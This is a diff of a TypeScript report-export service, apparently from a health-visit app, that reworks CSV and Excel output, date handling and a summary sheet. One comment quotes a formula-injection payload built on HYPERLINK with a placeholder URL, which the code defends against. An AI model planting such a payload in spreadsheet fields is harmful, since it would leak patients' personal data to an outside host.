@@ -10,17 +10,53 @@
 import { File, Paths } from 'expo-file-system';
 import * as Sharing from 'expo-sharing';
 import { utils, write } from 'xlsx';
-import { Visita } from '../types';
+import type { CellObject, WorkSheet } from 'xlsx';
+import { VisitaListada } from '../types';
 import { formatDate, formatDateTime } from '../utils/formatters';
 
 export type PeriodoRelatorio = 'dia' | 'semana' | 'mes';
 export type FormatoRelatorio = 'csv' | 'xlsx';
 
 export interface DadosRelatorio {
-  visitas: Visita[];
+  visitas: VisitaListada[];
   periodo: PeriodoRelatorio;
   data_referencia: string;
 }
+
+/**
+ * Uma coluna do relatório.
+ *
+ * `tipo` decide como a célula vai para a planilha: data entra como data de
+ * verdade, para o Excel ordenar e filtrar pelo calendário. Gravada como
+ * texto, "02/11" vinha depois de "13/10" na ordenação.
+ */
+interface Coluna {
+  titulo: string;
+  tipo: 'dia' | 'instante' | 'texto';
+  largura?: number;
+  valor: (v: VisitaListada) => string | undefined;
+}
+
+const COLUNAS: Coluna[] = [
+  { titulo: 'Data', tipo: 'dia', largura: 12, valor: (v) => v.data_visita },
+  // A visita guarda só o dia. Hora que existe de fato é a do registro no
+  // aparelho; a coluna "Horário" antiga mostrava 21:00 inventado pelo fuso.
+  { titulo: 'Registrado em', tipo: 'instante', largura: 17, valor: (v) => v.created_at },
+  { titulo: 'Endereço', tipo: 'texto', valor: enderecoDa },
+  { titulo: 'Bairro', tipo: 'texto', valor: (v) => v.bairro },
+  { titulo: 'Paciente', tipo: 'texto', valor: (v) => v.morador_nome },
+  { titulo: 'Status', tipo: 'texto', valor: (v) => traduzirStatus(v.status) },
+  { titulo: 'Motivo', tipo: 'texto', valor: (v) => v.motivo_visita },
+  { titulo: 'Queixas', tipo: 'texto', valor: (v) => v.queixas },
+  { titulo: 'Observações', tipo: 'texto', valor: (v) => v.observacoes },
+  { titulo: 'Agendamento', tipo: 'texto', valor: (v) => (v.precisa_agendamento ? 'Sim' : 'Não') },
+  { titulo: 'Especialidade', tipo: 'texto', valor: (v) => v.especialidade_agendamento },
+];
+
+const LARGURA_MINIMA = 10;
+const LARGURA_MAXIMA = 60;
+const FORMATO_DIA = 'dd/mm/yyyy';
+const FORMATO_INSTANTE = 'dd/mm/yyyy hh:mm';
 
 export const exportService = {
   /**
@@ -30,27 +66,14 @@ export const exportService = {
     dados: DadosRelatorio,
     formato: FormatoRelatorio = 'xlsx'
   ): Promise<void> {
-    const linhas = dados.visitas.map((v) => ({
-      'Data': formatDate(v.data_visita),
-      // A visita guarda só o dia. Hora que existe de fato é a do registro no
-      // aparelho; a coluna "Horário" antiga mostrava 21:00 inventado pelo fuso.
-      'Registrado em': formatDateTime(v.created_at),
-      'Endereço': v.residencia
-        ? `${v.residencia.logradouro}, ${v.residencia.numero} - ${v.residencia.bairro}`
-        : v.residencia_id,
-      'Paciente': v.morador?.nome ?? '-',
-      'Status': traduzirStatus(v.status),
-      'Queixas': v.queixas ?? '-',
-      'Observações': v.observacoes ?? '-',
-      'Agendamento': v.precisa_agendamento ? 'Sim' : 'Não',
-      'Especialidade': v.especialidade_agendamento ?? '-',
-    }));
+    if (dados.visitas.length === 0) throw new Error('Sem dados para exportar');
 
+    const visitas = ordenarCronologicamente(dados.visitas);
     const nome = `visitas_${dados.periodo}_${dados.data_referencia}`;
     if (formato === 'csv') {
-      await exportarCSV(linhas, nome);
+      await exportarCSV(visitas, nome);
     } else {
-      await exportarExcel(linhas, `Visitas - ${traduzirPeriodo(dados.periodo)}`, nome);
+      await exportarExcel(visitas, dados, nome);
     }
   },
 };
@@ -58,6 +81,26 @@ export const exportService = {
 // ============================================================
 // HELPERS INTERNOS
 // ============================================================
+
+/**
+ * O endereço vem do JOIN com residências, que `visitaRepository.listar` faz.
+ *
+ * Antes o repositório descartava essas colunas no mapeamento e a planilha
+ * recebia o id da residência, um UUID, no lugar do endereço.
+ */
+function enderecoDa(v: VisitaListada): string | undefined {
+  if (!v.logradouro) return undefined;
+  return v.numero ? `${v.logradouro}, ${v.numero}` : v.logradouro;
+}
+
+/** Do dia mais antigo para o mais novo; no mesmo dia, pela hora do registro. */
+function ordenarCronologicamente(visitas: VisitaListada[]): VisitaListada[] {
+  return [...visitas].sort(
+    (a, b) =>
+      a.data_visita.slice(0, 10).localeCompare(b.data_visita.slice(0, 10)) ||
+      a.created_at.localeCompare(b.created_at)
+  );
+}
 
 /**
  * Grava o arquivo na pasta de documentos e devolve a URI.
@@ -75,53 +118,149 @@ function gravar(nomeArquivo: string, conteudo: string | Uint8Array): string {
 }
 
 /**
- * Neutraliza injeção de fórmula em planilha.
+ * Neutraliza injeção de fórmula no CSV.
  *
- * Excel e LibreOffice executam o conteúdo de uma célula que começa com `=`,
- * `+`, `-`, `@`, tab ou retorno de carro. Como as queixas e observações são
- * texto livre digitado pelo agente em campo, um valor como
+ * Excel e LibreOffice executam o conteúdo de uma célula de CSV que começa com
+ * `=`, `+`, `-`, `@`, tab ou retorno de carro. Como as queixas e observações
+ * são texto livre digitado pelo agente em campo, um valor como
  * `=HYPERLINK("http://...&"&A1)` vazaria a linha inteira para fora no momento
- * em que alguém da secretaria abrisse o relatório. Prefixar com apóstrofo faz
- * a planilha tratar como texto, e o apóstrofo não aparece na célula.
+ * em que alguém da secretaria abrisse o relatório. O apóstrofo faz a planilha
+ * tratar como texto.
+ *
+ * No .xlsx isto não é usado: lá cada célula é gravada com o tipo texto
+ * declarado, e o Excel não interpreta texto como fórmula. O apóstrofo
+ * aplicado no .xlsx aparecia na célula, e todo campo vazio saía como `'-`.
  */
-function neutralizarFormula(valor: unknown): string {
-  const texto = String(valor ?? '');
+function neutralizarFormula(texto: string): string {
   return /^[=+\-@\t\r]/.test(texto) ? `'${texto}` : texto;
 }
 
-async function exportarCSV(
-  dados: Record<string, unknown>[],
-  nomeArquivo: string
-): Promise<void> {
-  if (dados.length === 0) throw new Error('Sem dados para exportar');
+function textoDaCelula(coluna: Coluna, v: VisitaListada): string {
+  const bruto = coluna.valor(v);
+  if (!bruto) return '';
+  if (coluna.tipo === 'dia') return formatDate(bruto.slice(0, 10));
+  if (coluna.tipo === 'instante') return formatDateTime(bruto);
+  return bruto;
+}
 
-  const headers = Object.keys(dados[0]).join(';');
-  const rows = dados.map((row) =>
-    Object.values(row)
-      .map((v) => `"${neutralizarFormula(v).replace(/"/g, '""')}"`)
-      .join(';')
+async function exportarCSV(visitas: VisitaListada[], nomeArquivo: string): Promise<void> {
+  const cabecalho = COLUNAS.map((c) => c.titulo).join(';');
+  const linhas = visitas.map((v) =>
+    COLUNAS.map((c) => `"${neutralizarFormula(textoDaCelula(c, v)).replace(/"/g, '""')}"`).join(';')
   );
-  const csv = [headers, ...rows].join('\n');
+  const csv = [cabecalho, ...linhas].join('\n');
   const bom = '﻿'; // BOM para Excel reconhecer UTF-8
 
   const uri = gravar(`${nomeArquivo}.csv`, bom + csv);
   await compartilharArquivo(uri, 'text/csv');
 }
 
+// ------------------------------------------------------------
+// Excel
+// ------------------------------------------------------------
+
+const DIAS_ATE_1970 = 25569; // 30/12/1899 (dia zero do Excel) até 01/01/1970
+const MS_POR_DIA = 86_400_000;
+
+/**
+ * `2026-10-13` como número de série do Excel, sem passar pelo fuso.
+ *
+ * `new Date('2026-10-13')` é meia-noite UTC, que no Brasil é o dia 12 às 21h.
+ * Montar a data pelos campos do texto evita o dia anterior.
+ */
+function serialDoDia(iso: string): number | null {
+  const [ano, mes, dia] = iso.slice(0, 10).split('-').map(Number);
+  if (!ano || !mes || !dia) return null;
+  return Date.UTC(ano, mes - 1, dia) / MS_POR_DIA + DIAS_ATE_1970;
+}
+
+/** Instante gravado em UTC, mostrado na hora local de quem exporta. */
+function serialDoInstante(iso: string): number | null {
+  const d = new Date(iso);
+  if (Number.isNaN(d.getTime())) return null;
+  const local = Date.UTC(
+    d.getFullYear(), d.getMonth(), d.getDate(), d.getHours(), d.getMinutes(), d.getSeconds()
+  );
+  return local / MS_POR_DIA + DIAS_ATE_1970;
+}
+
+function celula(coluna: Coluna, v: VisitaListada): CellObject | null {
+  const bruto = coluna.valor(v);
+  if (!bruto) return null;
+  if (coluna.tipo !== 'texto') {
+    const serial = coluna.tipo === 'dia' ? serialDoDia(bruto) : serialDoInstante(bruto);
+    if (serial !== null) {
+      return { t: 'n', v: serial, z: coluna.tipo === 'dia' ? FORMATO_DIA : FORMATO_INSTANTE };
+    }
+  }
+  return { t: 's', v: bruto };
+}
+
+/** Letra da coluna (0 → A). O relatório tem bem menos de 26 colunas. */
+function letra(indice: number): string {
+  return String.fromCharCode(65 + indice);
+}
+
+/** Largura de cada coluna pelo maior texto dela, dentro de um limite. */
+function larguras(visitas: VisitaListada[]): { wch: number }[] {
+  return COLUNAS.map((c) => {
+    if (c.largura) return { wch: c.largura };
+    const maior = Math.max(c.titulo.length, ...visitas.map((v) => (c.valor(v) ?? '').length));
+    return { wch: Math.min(LARGURA_MAXIMA, Math.max(LARGURA_MINIMA, maior + 2)) };
+  });
+}
+
+function abaDeVisitas(visitas: VisitaListada[]): WorkSheet {
+  const linhas = [
+    COLUNAS.map((c) => c.titulo),
+    ...visitas.map((v) => COLUNAS.map((c) => celula(c, v))),
+  ];
+  const aba = utils.aoa_to_sheet(linhas);
+  aba['!cols'] = larguras(visitas);
+  aba['!autofilter'] = { ref: `A1:${letra(COLUNAS.length - 1)}${visitas.length + 1}` };
+  return aba;
+}
+
+function abaDeResumo(visitas: VisitaListada[], dados: DadosRelatorio): WorkSheet {
+  const porStatus = new Map<string, number>();
+  for (const v of visitas) {
+    const status = traduzirStatus(v.status);
+    porStatus.set(status, (porStatus.get(status) ?? 0) + 1);
+  }
+  const agendar = visitas.filter((v) => v.precisa_agendamento).length;
+  const primeiro = visitas[0].data_visita;
+  const ultimo = visitas[visitas.length - 1].data_visita;
+
+  const linhas: (string | number | CellObject)[][] = [
+    ['Relatório de visitas'],
+    [],
+    ['Período', traduzirPeriodo(dados.periodo)],
+    ['Primeira visita', celulaDeDia(primeiro)],
+    ['Última visita', celulaDeDia(ultimo)],
+    ['Gerado em', { t: 'n', v: serialDoInstante(new Date().toISOString()) ?? 0, z: FORMATO_INSTANTE }],
+    [],
+    ['Total de visitas', visitas.length],
+    ...[...porStatus.entries()].map(([status, total]) => [status, total]),
+    ['Precisam de agendamento', agendar],
+  ];
+  const aba = utils.aoa_to_sheet(linhas);
+  aba['!cols'] = [{ wch: 26 }, { wch: 18 }];
+  return aba;
+}
+
+function celulaDeDia(iso: string): CellObject {
+  const serial = serialDoDia(iso);
+  return serial === null ? { t: 's', v: iso } : { t: 'n', v: serial, z: FORMATO_DIA };
+}
+
 async function exportarExcel(
-  dados: Record<string, unknown>[],
-  nomeAba: string,
+  visitas: VisitaListada[],
+  dados: DadosRelatorio,
   nomeArquivo: string
 ): Promise<void> {
-  if (dados.length === 0) throw new Error('Sem dados para exportar');
-
-  const seguros = dados.map((row) =>
-    Object.fromEntries(Object.entries(row).map(([k, v]) => [k, neutralizarFormula(v)]))
-  );
-
-  const ws = utils.json_to_sheet(seguros);
   const wb = utils.book_new();
-  utils.book_append_sheet(wb, ws, nomeAba);
+  utils.book_append_sheet(wb, abaDeVisitas(visitas), `Visitas - ${traduzirPeriodo(dados.periodo)}`);
+  utils.book_append_sheet(wb, abaDeResumo(visitas, dados), 'Resumo');
 
   // `type: 'array'` devolve ArrayBuffer, que é o que a API nova grava como
   // binário. O caminho antigo passava por base64 e dependia de EncodingType,
